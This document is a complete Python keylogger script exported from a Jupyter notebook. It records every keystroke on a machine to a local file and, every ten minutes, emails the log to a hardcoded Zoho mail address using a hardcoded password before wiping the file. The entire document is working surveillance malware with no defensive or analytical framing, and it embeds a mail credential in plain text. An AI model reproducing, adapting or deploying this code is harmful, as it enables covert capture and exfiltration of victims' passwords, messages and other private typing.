#!/usr/bin/env python
# coding: utf-8

# In[1]:


# Simple Python keylogger
# Author: Timothy Fuh
# This script, when run, will record keystrokes on a machine and save it to a text file
# NOTE: pynput must be pre installed on the machine for this script to work
# NOTE: You can install pynput with the command 'python -m pip install pynput' in the terminal
# NOTE: the text file must be saved in the same directoy as this script
# NOTE: in order for the script to run every hour, the 'schedule' package must be installed

import smtplib
import schedule
import time
import os.path
from email.message import EmailMessage
from pynput import keyboard


# Saves each keystroke onto the textfile keylog.txt
# If keylog.txt does not exist, it will create the file in the same directory
def keylog(key):
    with open("keylog.txt", "a") as keyfile:
        char = str(key)
        try:
            keyfile.write(char)
        except:
            pass

# Initialize variables for the email        
email_address = "fstackcap@zohomail.com"
email_password = "N0t@secr3"
msg = EmailMessage()
msg["Subject"] = "Key Log"
msg["From"] = email_address
msg["To"] = email_address
msg.set_content("Key Log")

# This function checks to see if the file keylog.txt exists.
# If it exists, it will read the file data, attach it to the email, send the email, then erase the data on the file
def mailer():
    if os.path.isfile('./keylog.txt') is True:
        with open('keylog.txt', 'r') as f:
            data = f.read()
        msg.add_attachment(data, subtype='plain', filename='keylog.txt')
        with smtplib.SMTP_SSL('smtp.zoho.com', 465) as s:
            s.login(email_address, email_password)
            s.send_message(msg)
        open('keylog.txt', 'w').close()

        

# Start a listener session and redirects the output to the function "keylog",
# Schedules the email for every x minutes, and initiates the email schedule            
def main():
    listener = keyboard.Listener(on_press=keylog)
    listener.start()
    schedule.every(10).minutes.do(mailer)
    while True:
        schedule.run_pending()
        time.sleep(1)
    
if __name__ == "__main__":
    main()


# In[ ]:




